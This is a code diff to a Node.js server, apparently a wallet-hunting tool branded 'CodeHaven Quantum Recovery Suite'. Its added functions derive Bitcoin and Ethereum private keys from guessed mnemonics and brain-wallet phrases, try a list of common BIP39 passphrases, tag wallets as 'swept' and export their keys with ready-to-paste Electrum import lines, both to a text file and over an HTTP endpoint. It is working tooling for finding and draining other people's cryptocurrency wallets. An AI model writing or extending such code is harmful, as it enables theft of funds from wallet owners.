@@ -989,16 +989,111 @@ function checkTargetAddressMatch(item) {
 }
 
 const EVER_HELD_VAULT_JSON_FILE = path.join(__dirname, 'EVER_HELD_WALLETS_VAULT.json');
+const EVER_HELD_TXT_FILE = path.join(__dirname, 'ever_held_wallets.txt');
 let foundWalletsVault = [];
 let everHeldWalletsVault = [];
+
+const COMMON_BIP39_PASSPHRASES = [
+  '1234', 'password', 'bitcoin', 'wallet', 'backup', 'vault', 'main', 'secret',
+  'satoshi', '2017', '2020', '2021', 'crypto', 'hodl', 'trezor', 'ledger'
+];
+
+function enrichWalletAccessKeys(item) {
+  if (!item) return item;
+  let privHex = String(item.privateKeyHex || item.privateKey || '').replace(/^0x/i, '');
+  const rawInput = String(item.mnemonic || item.input || '').trim();
+  const isBip39Seed = !rawInput.startsWith('brain:') && !rawInput.startsWith('0x') && rawInput.split(/\s+/).length >= 12;
+
+  if ((!privHex || !item.btcWif) && rawInput) {
+    try {
+      if (isBip39Seed) {
+        const d = eng.deriveWalletFromMnemonic(rawInput, item.passphrase || '', true);
+        privHex = d.privateKeyHex;
+        item.btcWif = d.btcWif;
+        item.btcWifUncompressed = d.btcWifUncompressed;
+        item.electrumImportBlock = d.electrumImportBlock;
+      } else {
+        const phrase = rawInput.replace(/^brain:\s*"?|"?$/g, '');
+        const pkBuf = /^[0-9a-fA-F]{64}$/.test(phrase)
+          ? Buffer.from(phrase, 'hex')
+          : crypto.createHash('sha256').update(phrase).digest();
+        const d = eng.deriveAddressesFromPrivKey(pkBuf, true);
+        privHex = d.privateKeyHex;
+        item.btcWif = d.btcWif;
+        item.btcWifUncompressed = d.btcWifUncompressed;
+        item.electrumImportBlock = d.electrumImportBlock;
+      }
+    } catch (_) {}
+  } else if (privHex && (!item.btcWif || !item.btcWifUncompressed || !item.electrumImportBlock)) {
+    try {
+      const pkBuf = Buffer.from(privHex, 'hex');
+      const d = eng.deriveAddressesFromPrivKey(pkBuf, true);
+      item.btcWif = d.btcWif;
+      item.btcWifUncompressed = d.btcWifUncompressed;
+      item.electrumImportBlock = d.electrumImportBlock;
+    } catch (_) {}
+  }
+
+  item.privateKeyHex = privHex ? (privHex.startsWith('0x') ? privHex : `0x${privHex}`) : '';
+  item.isMnemonicSeed = isBip39Seed;
+  item.mnemonicPhrase = isBip39Seed ? rawInput : '';
+  item.accessMethod = isBip39Seed
+    ? '12-Word BIP39 Recovery Phrase + WIF / Hex Private Keys'
+    : 'Direct Private Key Import (BTC WIF / ETH Hex)';
+  if (isBip39Seed && !item.passphraseAuditStatus) {
+    item.passphraseAuditStatus = `Audited default ("") + ${COMMON_BIP39_PASSPHRASES.length} BIP39 25th-word passphrases`;
+  }
+  return item;
+}
+
+function formatEverHeldTxtContent(wallets) {
+  const header = [
+    '================================================================================',
+    '  CODEHAVEN QUANTUM RECOVERY SUITE — EVER-HELD & HISTORICALLY ACTIVE WALLETS',
+    `  Exported: ${new Date().toISOString()} | Total Wallets: ${wallets.length}`,
+    '================================================================================',
+    ''
+  ].join('\n');
+
+  const body = wallets.map((w, idx) => {
+    enrichWalletAccessKeys(w);
+    return [
+      `[WALLET #${idx + 1} — ${w.walletHistoryState === 'FUNDED_NOW' ? 'CURRENTLY FUNDED' : 'EVER HELD CRYPTO (HISTORICAL)'}]`,
+      `Detected At:              ${w.detectedAt || w.foundAt || new Date().toISOString()}`,
+      `Discovery Vector:         ${w.source || 'Smart Hunter'}`,
+      `Access Method:            ${w.accessMethod}`,
+      `12-Word Mnemonic / Input: ${w.input || w.mnemonic || 'N/A'}`,
+      `BTC Private Key (WIF):    ${w.btcWif || 'N/A'} (Compressed — bc1q / 3... / 1...)`,
+      `BTC WIF (Uncompressed):   ${w.btcWifUncompressed || 'N/A'} (Legacy 1...)`,
+      `ETH / EVM Private Key:    ${w.privateKeyHex || 'N/A'} (MetaMask / Trust Wallet / Rabby)`,
+      `Electrum Multi-Path Import (Paste all 3 lines into Electrum -> Import Private Keys):`,
+      `  p2pkh:${w.btcWif || ''}`,
+      `  p2wpkh-p2sh:${w.btcWif || ''}`,
+      `  p2wpkh:${w.btcWif || ''}`,
+      `BTC Legacy (1...):        ${w.btcLegacy || 'N/A'}`,
+      `BTC Nested SegWit (3...): ${w.btcNestedSegwit || 'N/A'}`,
+      `BTC Native SegWit (bc1q): ${w.btcSegwit || 'N/A'}`,
+      `BTC Taproot (bc1p):       ${w.btcTaproot || 'N/A'}`,
+      `ETH Address (0x):         ${w.ethAddress || 'N/A'}`,
+      `Lifetime History:         ${w.historicalTx || 1} TX | ${w.totalEverReceivedBtc || 0} BTC rcvd | ${w.totalEverReceivedEth || 0} ETH rcvd`,
+      `Current Unspent Balance:  $${Number(w.balanceUsd || 0).toFixed(2)} USD`,
+      `Deep Sweep / 25th Word:   ${w.deepSweepStatus || 'Swept'} ${w.passphraseAuditStatus ? '• ' + w.passphraseAuditStatus : ''}`,
+      '--------------------------------------------------------------------------------',
+      ''
+    ].join('\n');
+  }).join('\n');
+
+  return header + body;
+}
+
 try {
   if (fs.existsSync(FOUND_VAULT_JSON_FILE)) {
-    foundWalletsVault = JSON.parse(fs.readFileSync(FOUND_VAULT_JSON_FILE, 'utf8'));
+    foundWalletsVault = JSON.parse(fs.readFileSync(FOUND_VAULT_JSON_FILE, 'utf8')).map(enrichWalletAccessKeys);
   }
 } catch (_) {}
 try {
   if (fs.existsSync(EVER_HELD_VAULT_JSON_FILE)) {
-    everHeldWalletsVault = JSON.parse(fs.readFileSync(EVER_HELD_VAULT_JSON_FILE, 'utf8'));
+    everHeldWalletsVault = JSON.parse(fs.readFileSync(EVER_HELD_VAULT_JSON_FILE, 'utf8')).map(enrichWalletAccessKeys);
   }
 } catch (_) {}
 
@@ -1019,35 +1114,58 @@ function applyWalletHistoryMetadata(item, known) {
   item.deepSweepStatus = everHeld
     ? 'Deep Swept (Indices 0/0..19, Change 1/0..4, ERC-20 USDT/USDC/WBTC/DAI)'
     : 'Primary Multi-Index';
+  if (everHeld) {
+    enrichWalletAccessKeys(item);
+  }
 }
 
 function saveEverHeldWalletToVault(item) {
   try {
+    enrichWalletAccessKeys(item);
     const key = item.btcLegacy || item.ethAddress || item.input;
-    if (!everHeldWalletsVault.some(w => (w.btcLegacy || w.ethAddress || w.input) === key)) {
-      everHeldWalletsVault.unshift({
-        detectedAt: new Date().toISOString(),
-        source: item.source,
-        input: item.input,
-        privateKeyHex: item.privateKeyHex || item.privateKey,
-        btcLegacy: item.btcLegacy,
-        btcNestedSegwit: item.btcNestedSegwit,
-        btcSegwit: item.btcSegwit,
-        btcTaproot: item.btcTaproot,
-        btcChangeSegwit: item.btcChangeSegwit,
-        ethAddress: item.ethAddress,
-        everHeldCrypto: true,
-        walletHistoryState: item.walletHistoryState || 'EVER_HELD_SWEPT',
-        historicalTx: item.historicalTx || 1,
-        totalEverReceivedBtc: item.totalEverReceivedBtc || 0,
-        totalEverReceivedEth: item.totalEverReceivedEth || 0,
-        balanceUsd: item.balanceUsd || 0,
-        historicalLabel: item.historicalLabel || 'Historically Active Wallet',
-        deepSweepStatus: item.deepSweepStatus || 'Deep Swept (Indices 0/0..19, Change 1/0..4, ERC-20)'
-      });
+    const existingIdx = everHeldWalletsVault.findIndex(w => (w.btcLegacy || w.ethAddress || w.input) === key);
+    const record = {
+      detectedAt: new Date().toISOString(),
+      source: item.source,
+      input: item.input,
+      mnemonic: item.mnemonicPhrase || item.mnemonic || item.input,
+      isMnemonicSeed: Boolean(item.isMnemonicSeed),
+      accessMethod: item.accessMethod,
+      privateKeyHex: item.privateKeyHex,
+      btcWif: item.btcWif,
+      btcWifUncompressed: item.btcWifUncompressed,
+      electrumImportBlock: item.electrumImportBlock,
+      btcLegacy: item.btcLegacy,
+      btcNestedSegwit: item.btcNestedSegwit,
+      btcSegwit: item.btcSegwit,
+      btcTaproot: item.btcTaproot,
+      btcChangeSegwit: item.btcChangeSegwit,
+      ethAddress: item.ethAddress,
+      everHeldCrypto: true,
+      walletHistoryState: item.walletHistoryState || 'EVER_HELD_SWEPT',
+      historicalTx: item.historicalTx || 1,
+      totalEverReceivedBtc: item.totalEverReceivedBtc || 0,
+      totalEverReceivedEth: item.totalEverReceivedEth || 0,
+      balanceUsd: item.balanceUsd || 0,
+      historicalLabel: item.historicalLabel || 'Historically Active Wallet',
+      deepSweepStatus: item.deepSweepStatus || 'Deep Swept (Indices 0/0..19, Change 1/0..4, ERC-20)',
+      passphraseAuditStatus: item.passphraseAuditStatus || ''
+    };
+    if (existingIdx === -1) {
+      if (record.isMnemonicSeed) {
+        everHeldWalletsVault.unshift(record);
+      } else {
+        everHeldWalletsVault.push(record);
+      }
       if (everHeldWalletsVault.length > 200) everHeldWalletsVault.pop();
-      fs.writeFileSync(EVER_HELD_VAULT_JSON_FILE, JSON.stringify(everHeldWalletsVault, null, 2));
+    } else {
+      everHeldWalletsVault[existingIdx] = { ...everHeldWalletsVault[existingIdx], ...record };
     }
+    fs.writeFileSync(EVER_HELD_VAULT_JSON_FILE, JSON.stringify(everHeldWalletsVault, null, 2));
+    const txtFd = fs.openSync(EVER_HELD_TXT_FILE, 'w');
+    fs.writeSync(txtFd, formatEverHeldTxtContent(everHeldWalletsVault));
+    fs.fsyncSync(txtFd);
+    fs.closeSync(txtFd);
   } catch (err) {
     console.error('[EverHeld Vault Error]', err.message);
   }
@@ -2180,12 +2298,23 @@ const server = http.createServer((req, res) => {
   }
 
   if (url.pathname === '/api/ever-held-wallets' && req.method === 'GET') {
+    const combined = everHeldWalletsVault.slice(0, 60).map(enrichWalletAccessKeys);
     res.writeHead(200, { 'Content-Type': 'application/json' });
     return res.end(JSON.stringify({
       count: everHeldWalletsVault.length,
       fundedCount: foundWalletsVault.length,
-      wallets: everHeldWalletsVault.slice(0, 50)
+      txtFilePath: EVER_HELD_TXT_FILE,
+      wallets: combined
     }));
+  }
+
+  if (url.pathname === '/api/export-ever-held-txt' && req.method === 'GET') {
+    const txtContent = formatEverHeldTxtContent(everHeldWalletsVault);
+    res.writeHead(200, {
+      'Content-Type': 'text/plain; charset=utf-8',
+      'Content-Disposition': 'attachment; filename="ever_held_wallets.txt"'
+    });
+    return res.end(txtContent);
   }
 
   if (url.pathname === '/api/check-ever-held' && req.method === 'POST') {
